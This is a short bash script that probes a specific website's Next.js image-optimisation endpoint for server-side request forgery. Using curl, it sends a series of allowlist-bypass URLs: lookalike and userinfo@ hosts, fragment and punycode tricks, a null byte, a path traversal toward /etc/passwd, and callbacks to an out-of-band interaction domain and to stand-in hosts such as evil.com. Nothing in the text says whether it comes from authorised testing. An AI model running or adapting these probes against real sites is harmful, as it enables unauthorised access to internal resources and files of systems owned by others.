#!/bin/bash
H='https://www.infinitycapital.bh'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
OOB='oob7cc475ef81d5.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
probe(){ printf "%-78s " "$2"; curl -sk -o /tmp/b2 -w "code=%{http_code} size=%{size_download} ct=%{content_type}" --get --data-urlencode "url=$1" -d "w=1080" -d "q=75" "$H/_next/image" -A "$UA"; echo " | $(head -c 80 /tmp/b2 | tr -d '\0\n')"; }
A='images.ctfassets.net'
echo "=== allowlist bypass attempts (domain=images.ctfassets.net)"
probe "https://${A}.oob7cc475ef81d5.attacker.example/x.png" "subdomain-lookalike"
probe "https://oob7cc475ef81d5.${A}/x.png" "prefix-lookalike"
probe "https://${A}@oob7cc475ef81d5.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/x.png" "userinfo@evil"
probe "https://${A}#@oob7cc475ef81d5.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/x.png" "fragment-trick"
probe "https://oob7cc475ef81d5.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/${A}/x.png" "path-contains-allowed"
probe "https://${A}/../../../../etc/passwd" "traversal"
probe "//${A}/x.png" "protocol-relative"
probe "https://${A}.xn--0zwm56d/x.png" "punycode"
probe "https://evil.com/?x=https://${A}/y.png" "url-in-query"
probe "https://${A}/x.png%00.png" "nullbyte"
echo "=== OOB direct (control) - expect 400 = blocked by allowlist"
probe "http://${OOB}/ssrf.png" "oob-direct"
